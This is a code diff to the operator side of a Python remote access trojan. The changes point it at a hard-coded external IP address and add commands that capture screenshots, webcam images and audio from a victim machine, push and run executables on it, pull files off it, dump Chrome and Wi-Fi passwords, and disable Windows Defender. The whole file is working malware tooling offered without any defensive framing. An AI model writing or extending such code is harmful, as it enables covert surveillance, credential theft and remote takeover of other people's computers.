@@ -1,10 +1,13 @@
 import socket
 import pickle
 import struct
-import cv2
+import time
+import soundfile as sf
+
 
 bridge = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-bridge.connect(('localhost',9999))
+bridge.connect(('45.80.148.246',9999))
+
 bridge.send(b"master")
 
 def receive(cli):
@@ -31,14 +34,60 @@ def send(data,cli):
     size = len(data)
     cli.sendall(struct.pack('>L',size)+data)
 
+#TODO:chrome password and sound recorder!
+
 while True:
     command = input("cmd>")
     send(command,bridge)
     
-    if command == "screenshare":
-        cv2.imshow("screen",cv2.imdecode(receive(bridge),cv2.IMREAD_COLOR))
-        if cv2.waitKey(1) == ord('q'):
-            bridge.close()
-            break
+    if command == "screenshot":
+        with open(f"screenshot{time.time()}.jpg","wb") as f:
+            f.write(receive(bridge).tobytes())
+
+    elif command == "camera capture":
+        with open(f"camera{time.time()}.jpg","wb") as f:
+            f.write(receive(bridge).tobytes())
+
+
+    elif "inject " in command: #inject run.exe
+        exe = command.replace("inject ","")
+        with open(exe,"rb") as f:
+            data = f.read()
+        send(data,bridge)
+
+
+    elif "retreive " in command: #retreive pp.exe
+        data = receive(bridge)
+        exe = command.replace("retreive ","")
+        with open(exe,"wb") as f:
+            f.write(data)
+
+
+    elif command == "cracker chrome": # get wifi informations (past data too) and chrome
+        data = receive(bridge)
+        for line in data:
+            print(line)
+
+
+    elif command == "cracker wifi": # get wifi informations (past data too) and chrome
+        data = receive(bridge)
+        for line in data:
+            print(line,data[line])
+
+
+    elif command == "disable defender":
+        print(receive(bridge))
+
+
+    elif "sound record" in command:# sound record 15
+        data = receive(bridge)
+        sf.write(f"soundrecord{time.time()}.wav", data, 44100)
+
+    elif command == "info":
+        data = receive(bridge)
+        for line in data:
+            print(line,data[line])
+
+
     else: #cmd
         print(receive(bridge))
